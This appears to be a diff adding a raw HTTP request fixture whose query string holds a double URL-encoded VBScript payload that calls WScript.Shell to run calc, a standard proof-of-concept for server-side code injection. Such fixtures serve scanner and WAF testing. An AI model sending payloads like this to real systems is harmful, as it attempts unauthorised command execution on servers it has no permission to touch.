@@ -1,0 +1,4 @@
+GET /a?q=o%253DCreateObject%2528%2522WScript.shell%2522%2529.run%2528%2522calc%2522%2529 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
